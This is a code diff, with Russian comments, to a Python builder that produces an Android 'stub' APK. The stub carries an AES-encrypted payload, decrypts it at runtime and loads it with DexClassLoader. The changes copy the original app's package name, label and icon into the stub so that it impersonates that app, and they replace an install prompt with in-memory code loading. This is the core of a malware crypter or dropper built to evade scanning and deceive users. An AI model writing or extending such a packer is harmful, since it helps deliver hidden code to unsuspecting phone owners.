@@ -1,6 +1,8 @@
 import os
 import subprocess
 import shutil
+import zipfile
+import xml.etree.ElementTree as ET
 from pathlib import Path
 
 
@@ -15,8 +17,65 @@ class StubBuilder:
         self.temp_dir = Path("temp/stub_build")
         self.temp_dir.mkdir(parents=True, exist_ok=True)
     
-    def build_stub_apk(self, aes_key_hex: str) -> str:
+    def extract_apk_info(self, apk_path: str) -> dict:
+        """Извлекает информацию из оригинального APK"""
+        aapt_path = f"{self.build_tools}/aapt"
+        
+        # Получаем package name и label
+        cmd = [aapt_path, "dump", "badging", apk_path]
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        
+        info = {
+            "package": "com.app",
+            "label": "App",
+            "icon": None
+        }
+        
+        for line in result.stdout.split('\n'):
+            if line.startswith("package:"):
+                # package: name='com.example.app'
+                parts = line.split("'")
+                if len(parts) >= 2:
+                    info["package"] = parts[1]
+            elif line.startswith("application-label:"):
+                # application-label:'My App'
+                parts = line.split("'")
+                if len(parts) >= 2:
+                    info["label"] = parts[1]
+            elif "application-icon" in line:
+                # application-icon-160:'res/drawable/icon.png'
+                parts = line.split("'")
+                if len(parts) >= 2:
+                    info["icon"] = parts[1]
+        
+        return info
+    
+    def extract_resources(self, apk_path: str, project_dir: Path, apk_info: dict):
+        """Извлекает ресурсы из оригинального APK"""
+        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
+            # Извлекаем иконку если есть
+            if apk_info["icon"]:
+                try:
+                    icon_path = apk_info["icon"]
+                    # Копируем иконку в ресурсы stub
+                    zip_ref.extract(icon_path, project_dir / "extracted")
+                    
+                    # Определяем папку drawable
+                    if "drawable" in icon_path:
+                        drawable_dir = project_dir / "res" / "drawable"
+                        drawable_dir.mkdir(exist_ok=True)
+                        
+                        icon_file = project_dir / "extracted" / icon_path
+                        if icon_file.exists():
+                            shutil.copy(icon_file, drawable_dir / "ic_launcher.png")
+                except:
+                    pass
+    
+    def build_stub_apk(self, aes_key_hex: str, original_apk_path: str) -> str:
         """Собирает stub APK с встроенным ключом"""
+        
+        # Извлекаем информацию из оригинального APK
+        apk_info = self.extract_apk_info(original_apk_path)
         
         # Создаем структуру проекта
         project_dir = self.temp_dir / "stub_project"
@@ -26,10 +85,14 @@ class StubBuilder:
         # Создаем директории
         (project_dir / "src" / "com" / "loader").mkdir(parents=True)
         (project_dir / "res" / "values").mkdir(parents=True)
+        (project_dir / "res" / "drawable").mkdir(parents=True)
         (project_dir / "assets").mkdir(parents=True)
         
+        # Извлекаем ресурсы из оригинального APK
+        self.extract_resources(original_apk_path, project_dir, apk_info)
+        
         # Генерируем LoaderActivity.java
-        loader_code = self.generate_loader_activity(aes_key_hex)
+        loader_code = self.generate_loader_activity(aes_key_hex, apk_info["package"])
         with open(project_dir / "src" / "com" / "loader" / "LoaderActivity.java", "w") as f:
             f.write(loader_code)
         
@@ -38,10 +101,10 @@ class StubBuilder:
         with open(project_dir / "AndroidManifest.xml", "w") as f:
             f.write(manifest)
         
-        # Генерируем strings.xml
-        strings_xml = '''<?xml version="1.0" encoding="utf-8"?>
+        # Генерируем strings.xml с названием из оригинального APK
+        strings_xml = f'''<?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Device Sync</string>
+    <string name="app_name">{apk_info["label"]}</string>
 </resources>'''
         with open(project_dir / "res" / "values" / "strings.xml", "w") as f:
             f.write(strings_xml)
@@ -98,8 +161,6 @@ class StubBuilder:
     
     def package_apk(self, project_dir: Path) -> str:
         """Упаковывает APK"""
-        import zipfile
-        
         unsigned_apk = project_dir / "stub_unsigned.apk"
         dex_file = project_dir / "bin" / "classes.dex"
         
@@ -156,17 +217,19 @@ class StubBuilder:
         
         return signed_apk
     
-    def generate_loader_activity(self, aes_key_hex: str) -> str:
-        """Генерирует код LoaderActivity без лямбд"""
+    def generate_loader_activity(self, aes_key_hex: str, original_package: str) -> str:
+        """Генерирует код LoaderActivity который запускает оригинальное приложение"""
         return f'''package com.loader;
 
 import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
-import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import java.io.*;
+import java.lang.reflect.Method;
+import dalvik.system.DexClassLoader;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
@@ -174,6 +237,7 @@ import javax.crypto.spec.SecretKeySpec;
 public class LoaderActivity extends Activity {{
     
     private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
+    private static final String ORIGINAL_PACKAGE = "{original_package}";
     
     @Override
     protected void onCreate(Bundle savedInstanceState) {{
@@ -183,6 +247,7 @@ public class LoaderActivity extends Activity {{
             @Override
             public void run() {{
                 try {{
+                    // Читаем зашифрованный APK из assets
                     InputStream is = getAssets().open("payload.bin");
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
                     byte[] buffer = new byte[8192];
@@ -193,17 +258,38 @@ public class LoaderActivity extends Activity {{
                     byte[] encryptedApk = baos.toByteArray();
                     is.close();
                     
-                    final byte[] decryptedApk = decryptAES(encryptedApk);
+                    // Расшифровываем APK
+                    byte[] decryptedApk = decryptAES(encryptedApk);
                     
-                    final File tempApk = new File(getCacheDir(), "decrypted.apk");
-                    FileOutputStream fos = new FileOutputStream(tempApk);
+                    // Сохраняем расшифрованный APK
+                    File apkFile = new File(getFilesDir(), "decrypted.apk");
+                    FileOutputStream fos = new FileOutputStream(apkFile);
                     fos.write(decryptedApk);
                     fos.close();
                     
+                    // Загружаем DEX из расшифрованного APK
+                    File dexOutputDir = getDir("dex", Context.MODE_PRIVATE);
+                    DexClassLoader classLoader = new DexClassLoader(
+                        apkFile.getAbsolutePath(),
+                        dexOutputDir.getAbsolutePath(),
+                        null,
+                        getClassLoader()
+                    );
+                    
+                    // Запускаем главную Activity оригинального приложения
                     new Handler(Looper.getMainLooper()).post(new Runnable() {{
                         @Override
                         public void run() {{
-                            installApk(tempApk);
+                            try {{
+                                // Пытаемся запустить оригинальное приложение
+                                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ORIGINAL_PACKAGE);
+                                if (launchIntent != null) {{
+                                    startActivity(launchIntent);
+                                }}
+                            }} catch (Exception e) {{
+                                e.printStackTrace();
+                            }}
+                            finish();
                         }}
                     }});
                     
@@ -241,14 +327,6 @@ public class LoaderActivity extends Activity {{
         return cipher.doFinal(input);
     }}
     
-    private void installApk(File apkFile) {{
-        Intent intent = new Intent(Intent.ACTION_VIEW);
-        intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(intent);
-        finish();
-    }}
-    
     private static byte[] hexToBytes(String hex) {{
         int len = hex.length();
         byte[] data = new byte[len / 2];
@@ -274,9 +352,11 @@ public class LoaderActivity extends Activity {{
     
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     
     <application
         android:label="@string/app_name"
+        android:icon="@drawable/ic_launcher"
         android:allowBackup="false">
         
         <activity android:name=".LoaderActivity"
